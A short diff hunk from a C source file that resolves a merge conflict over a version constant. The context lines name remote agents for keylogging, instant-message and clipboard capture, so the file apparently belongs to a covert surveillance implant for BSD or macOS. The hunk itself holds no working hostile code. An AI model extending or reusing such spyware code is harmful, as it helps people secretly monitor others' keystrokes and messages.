@@ -88,11 +88,8 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-<<<<<<< HEAD
-u_int gVersion      = 2012041601;
-=======
+
 u_int gVersion      = 2012013102;
->>>>>>> 8ca82e43d99bd9c5dd20638b2386603847af4b07
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
